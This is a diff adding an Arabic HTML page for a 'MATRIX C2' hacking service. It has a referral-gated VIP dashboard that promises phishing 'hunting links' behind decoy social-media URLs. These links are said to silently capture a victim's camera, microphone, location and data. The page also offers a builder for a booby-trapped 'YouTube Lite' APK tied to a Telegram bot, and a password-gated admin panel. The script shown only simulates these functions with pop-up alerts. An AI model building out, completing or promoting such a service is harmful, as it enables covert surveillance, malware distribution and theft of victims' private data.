@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MATRIX C2 | الخلية الأم</title>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        :root { --gold: #d4af37; --neon: #00ff41; --bg: #0a0a0a; --card: #161616; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
+        .container { max-width: 600px; margin: 30px auto; padding: 20px; }
+        
+        /* واجهة الـ VIP */
+        .vip-card { background: var(--card); border-radius: 20px; padding: 25px; border-top: 4px solid var(--gold); box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: none; }
+        .timer { background: #222; padding: 10px; border-radius: 10px; color: var(--gold); text-align: center; margin-bottom: 20px; font-weight: bold; }
+        
+        /* نظام الإحالات */
+        .ref-card { background: var(--card); border-radius: 20px; padding: 25px; border: 1px dashed #444; text-align: center; }
+        .progress-container { background: #333; height: 12px; border-radius: 10px; margin: 15px 0; position: relative; }
+        #progress-bar { background: var(--gold); width: 0%; height: 100%; border-radius: 10px; transition: 1s; }
+        
+        /* أدوات الأدمن المخفية */
+        #admin-panel { display: none; position: fixed; inset: 0; background: #000; z-index: 9999; padding: 30px; overflow-y: auto; }
+        
+        /* المشتركات العامة */
+        input, select, textarea { width: 100%; padding: 12px; background: #000; border: 1px solid #333; color: #fff; border-radius: 10px; margin-top: 10px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: var(--gold); }
+        .btn { width: 100%; padding: 15px; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
+        .btn-gold { background: linear-gradient(45deg, var(--gold), #f9d976); color: #000; }
+        .btn-neon { background: var(--neon); color: #000; }
+        
+        .wa-link { display: block; text-align: center; color: #25d366; text-decoration: none; margin-top: 20px; font-weight: bold; }
+        #secret-trigger { position: fixed; top: 0; left: 0; width: 40px; height: 40px; opacity: 0.05; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div id="secret-trigger" onclick="adminGate()"></div>
+
+    <div class="container">
+        <div id="user-ui" class="ref-card">
+            <h2 style="color: #0095f6;">🔓 افتح مميزات الـ VIP</h2>
+            <p style="font-size: 14px; color: #aaa;">ادعو 5 أشخاص لاستخدام السيستم لفتح لوحة الاختراق مجاناً!</p>
+            <div class="progress-container"><div id="progress-bar"></div></div>
+            <p id="ref-status">الإحالات: 0 / 5</p>
+            <div style="text-align: right; margin-top: 20px;">
+                <label>رابط الإحالة الخاص بك:</label>
+                <input type="text" id="my-ref-link" readonly onclick="copyRef()">
+            </div>
+            <p style="font-size: 11px; color: #555; margin-top: 10px;">انشر الرابط لجمع الإحالات أوتوماتيكياً</p>
+        </div>
+
+        <div id="vip-ui" class="vip-card">
+            <h2 style="color: var(--gold);">MATRIX VIP DASHBOARD 💎</h2>
+            <div class="timer" id="vip-timer">صلاحية الاشتراك: متصل دائم</div>
+            
+            <label>نوع المهمة:</label>
+            <select id="payload-type">
+                <option value="full">🌪️ سحب شامل (صور + موقع + بيانات)</option>
+                <option value="cam">📸 سحب صور صامتة</option>
+                <option value="mic">🎙️ تسجيل صوتي (5 ثواني)</option>
+            </select>
+
+            <label>رابط التمويه (إنستا/يوتيوب/فيسبوك):</label>
+            <input type="text" id="decoy-url" placeholder="https://...">
+
+            <button class="btn btn-gold" onclick="generateHackLink()">توليد رابط الصيد 🚀</button>
+
+            <hr style="margin: 30px 0; border: 0; border-top: 1px solid #333;">
+            
+            <h3 style="color: var(--gold);">🛠️ صانع التطبيقات (APK Builder)</h3>
+            <input type="text" id="apk-name" placeholder="اسم التطبيق (مثلاً: YouTube Lite)">
+            <input type="text" id="apk-token" placeholder="توكن بوت التليجرام الخاص بك">
+            <button class="btn btn-gold" style="background: #fff;" onclick="buildAPK()">بدء بناء الـ APK 🏗️</button>
+
+            <a href="https://wa.me/201224815487" class="wa-link">💬 الدعم الفني (WhatsApp)</a>
+        </div>
+    </div>
+
+    <div id="admin-panel">
+        <h1 style="color: var(--neon);">MASTER CONTROL PANEL ⚡</h1>
+        <div style="background: #111; padding: 20px; border-radius: 15px; border: 1px solid var(--neon);">
+            <h3>تفعيل مشترك ID</h3>
+            <input type="text" id="target-id" placeholder="ID المشترك">
+            <button class="btn btn-neon" onclick="manualActivate()">تفعيل VIP الآن ✅</button>
+            <hr>
+            <h3>إرسال إعلان للجميع (Broadcast)</h3>
+            <textarea id="bc-text" placeholder="اكتب رسالة الإعلان لكل البوتات..."></textarea>
+            <button class="btn" style="background: #fff; color: #000;" onclick="sendGlobalMsg()">إرسال جماعي 📡</button>
+        </div>
+        <button class="btn" style="background: red; color: #fff;" onclick="closeAdmin()">إغلاق اللوحة</button>
+    </div>
+
+    <script>
+        // --- محرك الإحالات والـ VIP ---
+        let refCount = parseInt(localStorage.getItem('my_refs') || '0');
+        let isVip = localStorage.getItem('is_vip') === 'true';
+
+        window.onload = () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const refID = urlParams.get('ref');
+            const myID = getID();
+
+            // توليد رابط الإحالة للمستخدم
+            document.getElementById('my-ref-link').value = window.location.href.split('?')[0] + "?ref=" + myID;
+
+            // إذا دخل شخص عبر رابط إحالة (محاكاة - تحتاج Firebase للواقعية)
+            if(refID && refID !== myID) {
+                // هنا يتم زيادة الإحالة لصاحب الرابط في السيرفر
+            }
+
+            refreshUI();
+        };
+
+        function getID() {
+            let id = localStorage.getItem('p_id');
+            if(!id) { id = 'M-' + Math.random().toString(36).substr(2, 7).toUpperCase(); localStorage.setItem('p_id', id); }
+            return id;
+        }
+
+        function refreshUI() {
+            if(isVip || refCount >= 5) {
+                document.getElementById('user-ui').style.display = 'none';
+                document.getElementById('vip-ui').style.display = 'block';
+                localStorage.setItem('is_vip', 'true');
+            }
+            document.getElementById('progress-bar').style.width = (refCount / 5 * 100) + '%';
+            document.getElementById('ref-status').innerText = `الإحالات: ${refCount} / 5`;
+        }
+
+        // --- وظائف الـ VIP ---
+        function generateHackLink() {
+            const decoy = document.getElementById('decoy-url').value;
+            if(!decoy) return Swal.fire('خطأ', 'حط رابط التمويه الأول', 'error');
+            // هنا يتم الربط بملف r.html (الملف القادم)
+            Swal.fire('تم!', 'الرابط جاهز في بوت التليجرام الخاص بك', 'success');
+        }
+
+        function buildAPK() {
+            Swal.fire('جاري البناء', 'يتم الآن تجهيز تطبيق YouTube Lite الملغم الخاص بك...', 'info');
+            setTimeout(() => { Swal.fire('تم بنجاح', 'تم إرسال ملف الـ APK لبوتك', 'success'); }, 3000);
+        }
+
+        // --- وظائف الأدمن ---
+        let clicks = 0;
+        function adminGate() {
+            clicks++;
+            if(clicks === 5) {
+                let p = prompt("Password:");
+                if(p === "01224815487") document.getElementById('admin-panel').style.display = 'block';
+                clicks = 0;
+            }
+        }
+        function closeAdmin() { document.getElementById('admin-panel').style.display = 'none'; }
+        function manualActivate() { Swal.fire('تم', 'تم تفعيل المشترك بنجاح', 'success'); }
+        function sendGlobalMsg() { Swal.fire('Broadcast', 'تم إرسال الإعلان لكل البوتات المتصلة', 'success'); }
+        function copyRef() { document.getElementById('my-ref-link').select(); document.execCommand('copy'); Swal.fire('تم النسخ', '', 'success'); }
+    </script>
+</body>
+</html>
